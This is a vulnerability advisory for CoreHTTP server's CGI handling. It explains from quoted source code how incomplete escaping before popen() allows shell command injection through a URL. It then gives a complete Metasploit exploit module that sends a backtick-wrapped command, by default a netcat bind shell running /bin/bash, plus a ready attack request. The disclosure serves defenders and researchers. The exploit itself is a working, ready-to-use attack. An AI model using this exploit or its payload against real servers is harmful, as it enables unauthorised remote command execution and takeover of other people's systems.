Package name: CoreHTTP server
Version: 0.5.3.1 and below (as long as cgi support is enabled)
Software URL: http://corehttp.sourceforge.net/
Exploit: http://aconole.brad-x.com/programs/corehttp_cgienabled.rb
Issue: CoreHTTP server fails to properly sanitize input before calling popen()
and allows an attacker using a standard web browser to execute arbitrary 
commands. 

NOTE: depending on the script and directory permissions, the attacker 
may not be able to view output.

Further Discussion: During code review / debugging of CoreHTTP, a look at http.c
source file revealed:

	/* escape the url for " and \ since we use it in popen */
	for (i = 0; i < PATHSIZE; i++) {
		if (url[i] == '\0') break;
		else if (url[i] == '\\' || url[i] == '\"' || url[i] == '\'') {
			find = url + i;
			strcpy(temp, find);
			*find = '\\';
			*(find+1) = '\0';
			strcat(url, temp);
			i++;
		}
	}

In the above, only " and \ are escaped, allowing one to specify |`& and any 
other special formatting.

The URL then gets broken into 2 parts:
- url (which in this case is a script)
- args (which contains our 'evil' buffer)

There is a caveat though:
		if (c == 0)  { /* TODO our dirlist perl script takes the path
				of the dir as the arg. the way we do cgi
				right now is scipt.pl?arg turns into
				commandprompt> ./script.pl arg. obviously
				when urlencode is implemented correctly this
				must be changed. */
			strcpy(args, url);
			strcpy(url, DIRLIST);
			break;
		}

In this, we can see that DIRLIST overwrites the value of url and url overwrites
the value of args - so for simple directory listing this vulnerability becomes
a bit more difficult to exploit (depending on directory name, the system could
still be vulnerable).

Finally, here's the call to popen:
	} else if (cmd[0] != '\0') { /* if its dynamic content */
		pipe(pipefd); /* make pipe then fork */
		c = fork();
		if (c > 0) { /* original, keep going */
			close(pipefd[1]); /* no need to write */
			sprocket->fd = pipefd[0];
			SetNonBlock(sprocket->fd);
		} else if (c == 0) { /* child, popen */
			close(pipefd[0]); /* no need to read */
			pipetoprog = popen(cmd, "r");
			/* fread should be non-blocking for this to exit fast
			when parent proc closes pipe */
			while ((i = fread(temp, 1, BUFSIZE, pipetoprog)) != 0
				&& write(pipefd[1], temp, i) > 0);
			pclose(pipetoprog);
			close(pipefd[1]);
			exit(EXIT_SUCCESS); /* exit after done */
		} else { /* failed */
			RemoveSprock(sprocket, &FIRSTSPROCK);
			return NULL;
		}

And there you have it. Simply download coreHTTP for yourself, build, enable CGI,
touch foo.pl and then send it a request for /foo.pl%60command%26%60 which will
set url to /foo.pl and args to `command&` and call popen. Voila!

===========

###
## MSF Exploit for CoreHTTP CGI Enabled Remote Arbitrary Command Execution
## CoreHTTP fails to properly sanitize user input before passing it to popen,
## allowing anyone with a web browser to run arbitrary commands.
## No CVE for this yet.
###

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'corehttp remote command execution',
			'Description'	=> %q{
				This module exploits a remote command execution vulnerability in corehttp versions 0.5.3.1 and earlier.
				It requires that you know the name of a cgi file on the server.
				NOTE: If you want to do something more than remote shell, you'll have to change CGICMD
			},
			'Author'	=> [ 'Aaron Conole' ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision:$',
			'References'	=>
				[
					[ 'URL', 'http://aconole.brad-x.com/advisories/corehttp.txt' ],
                                        [ 'URL', 'http://corehttp.sourceforge.net' ],
				],
			'Priviledged'	=> false,
			'Payload'	=>
				{
					'Space'       => 1024,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('CGIURI', [true, "The URI of the CGI file to request", "/foo.pl"]),
					OptString.new('CGICMD', [true, "The command to execute on the remote machine (note: it doesn't support redirection)", "nc -lvnp 4444 -e /bin/bash&"])
				], self.class)

	end

	def exploit

		timeout = 0.01

		print_status ("Building URI")

		uri = ""
		uri = uri.concat(datastore['CGIURI'])
		uri = uri.concat("?%60")
		uri.concat(datastore['CGICMD'])
		uri = uri.gsub(" ", "%20")
		uri.concat("%60")
		uri = uri.gsub("&", "%26")

		print_status("Trying URI #{uri}")

		response = send_request_raw({ 'uri' => uri}, timeout)

		handler
	end

end